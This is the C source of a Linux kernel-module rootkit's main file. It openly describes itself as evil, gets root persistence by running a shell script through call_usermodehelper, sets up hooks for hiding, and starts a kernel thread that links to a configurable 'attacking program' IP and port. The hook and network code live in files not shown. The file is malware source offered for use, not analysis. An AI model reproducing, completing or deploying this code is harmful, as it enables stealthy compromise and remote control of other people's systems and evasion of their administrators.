#include <linux/kthread.h>
#include <linux/module.h>

#include "hook.h"
#include "network.h"

static char *ip = "192.168.1.53";
static int port = 6667;
static struct task_struct *thread = NULL;

module_param(ip, charp, 0660);
module_param(port, int, 0660);
MODULE_PARM_DESC(ip, "IP address of the attacking program");
MODULE_PARM_DESC(port, "Port number of the attacking program");

// setup persistence by running shell script as root
static int persist(void) 
{
    struct subprocess_info *sub_info = NULL;
    char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    char *argv[] = { "/bin/sh", "-c", "/rootkit/persist/persist.sh >/rootkit/persist/log 2>&1", NULL };
    int status = 0;

    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL,
                                         NULL, NULL);
    if (sub_info == NULL)
    {
        pr_err("exec: failed to setup usermodehelper\n");
        return 1;
    }

    status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
    status = status >> 8;
    pr_info("persist: done. status: %d", status);

    return status;
}

static __init int rootkit_init(void)
{ 
    struct config *cfg = NULL;

    pr_info("rootkit: inserted.\n");

    // Persist
    pr_info("rootkit: setting persistence up...\n");
    if (persist() != 0) {
        pr_err("rootkit: couldn't setup persistence. exiting\n"); 
        return 0;
    }

    // Hide
    pr_info("rootkit: setting hooks up...\n");
    setup_hooks();

    // Network loop on separate thread
    cfg = kmalloc(sizeof(struct config), GFP_KERNEL);
    if (!cfg)
    {
        pr_err("rootkit: kmalloc for config struct failed. exiting.\n");
        return 0;
    }
    cfg->ip = ip;
    cfg->port = port;
    thread = kthread_run(network_loop, cfg, "loop_thread");
    if (IS_ERR(thread))
    {
        pr_err("rootkit: thread failed to start\n");
        kfree(cfg);
        return PTR_ERR(thread);
    }
    pr_info("rootkit: started network loop thread.\n");

    // cfg freed by network thread on exit
    return 0;
}

static __exit void rootkit_exit(void)
{
    pr_info("rootkit: rmmoding...\n");
    if (thread)
    {
        pr_info("rootkit: stopping network thread.\n");
        kthread_stop(thread);
    }
    network_exit();
    pr_info("rootkit: clearing function hooks.\n");
    clear_hooks();
    pr_info("rootkit: cleanup done.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("i'm pure evil");
MODULE_AUTHOR("Naim Chefirat");
